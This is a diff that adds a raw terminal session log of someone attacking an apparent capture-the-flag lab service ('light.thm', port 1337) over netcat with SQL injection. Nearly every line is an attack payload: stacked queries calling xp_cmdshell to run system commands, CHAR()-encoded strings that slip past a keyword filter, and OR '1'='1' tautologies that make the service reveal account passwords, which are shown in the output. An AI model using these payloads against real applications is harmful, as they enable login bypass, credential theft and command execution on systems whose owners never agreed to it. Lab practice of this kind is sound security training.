@@ -1,0 +1,75 @@
+Script started on 2025-01-19 18:14:14+03:00 [COMMAND="nc light.thm 1337" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+Welcome to the Light database!
+Please enter your username: admin' ; EXEC xp_cmdshell('ls'); OR 'a'='a^[[D^[[D                       id'); OR 'A'='A
+^C
+
+Script done on 2025-01-19 18:15:17+03:00 [COMMAND_EXIT_CODE="1"]
+Script started on 2025-01-19 18:15:19+03:00 [COMMAND="nc light.thm 1337" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+Welcome to the Light database!
+Please enter your username: admin' ; EXEC xp_cmdshell('echo test'); OR 'A'='A
+^C
+
+Script done on 2025-01-19 18:15:25+03:00 [COMMAND_EXIT_CODE="1"]
+Script started on 2025-01-19 18:15:30+03:00 [COMMAND="nc light.thm 1337" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+Welcome to the Light database!
+Please enter your username: admin';EXEC xp_cmdshell('echo test'); OR 'A'='A
+
+ls
+ls
+whoami
+
+^C
+
+Script done on 2025-01-19 18:17:12+03:00 [COMMAND_EXIT_CODE="1"]
+Script started on 2025-01-19 18:17:13+03:00 [COMMAND="nc light.thm 1337" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+Welcome to the Light database!
+Please enter your username: admin' ; EXEC xp_cmdshell(CHAR(101,99,104,111,32,116,101,115,116)); CHAR(83,69,76,69,67,84,32,42,32,70,82,79,77,32,115,121,115,111,98,106,101,99,116,115,59) OR 'A'='A
+
+^C
+
+Script done on 2025-01-19 18:18:45+03:00 [COMMAND_EXIT_CODE="1"]
+Script started on 2025-01-19 18:18:47+03:00 [COMMAND="nc light.thm 1337" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+Welcome to the Light database!
+Please enter your username: smokey
+Password: vYQ5ngPpw8AdUmL
+Please enter your username: light_admin
+Username not found.
+Please enter your username: admin' AND 1=1 GROUP BY username HAVING 1=1 OR '1'='1
+Username not found.
+Please enter your username: admin' AND 1=1 AND EXISTS (SELECT * FROM information_schema.users WHERE username LIKE '%admin%') OR '1'='1
+Ahh there is a word in there I don't like :(
+Please enter your username: EXISTS
+Username not found.
+Please enter your username: admin' OR EXISTS(SELECT 1 FROM mysql.user WHERE user='admin') OR '1'='1
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' OR 1=1 AND username LIKE 'admin%' OR '1'='1
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' OR 1=1 AND username IN ('admin') OR '1'='1
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' OR 1=1 GROUP BY username HAVING username='admin' OR '1'='1
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' OR 1=1 AND user() LIKE '%admin%' OR '1'='1
+Error: no such function: user
+Please enter your username: admin' OR 1=1 AND CHAR(65,66,67,68,69,70) OR '1'='1
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' OR 1=1 AND version() LIKE '%MySQL%' OR '1'='1
+Error: no such function: version
+Please enter your username: admin' OR 1=1 AND CHAR(65,66,67,68,69,70) LIKE 'admin%' OR '1'='1
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' OR 1=1 AND GROUP_CONCAT(username) LIKE '%admin%' OR '1'='1
+Error: misuse of aggregate function GROUP_CONCAT()
+Please enter your username: admin' OR 1=1 AND username IN ('admin', 'smokey') OR '1'='1
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' OR 1=1 GROUP BY username HAVING username='admin' OR '1'='1
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' OR 1=1 AND CHAR(97, 100, 109, 105, 110) LIKE '%admin%' OR '1'='1
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' OR 1=1 GROUP BY username HAVING GROUP_CONCAT(username) LIKE '%admin%' OR '1'='1
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' OR 1=1 GROUP BY username HAVING GROUP_CONCAT(username) LIKE '%admin%' OR '1'='1
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' OR 'A'='A
+Password: tF8tj2o94WE4LKC
+Please enter your username: ^C
+
+Script done on 2025-01-19 18:50:10+03:00 [COMMAND_EXIT_CODE="1"]
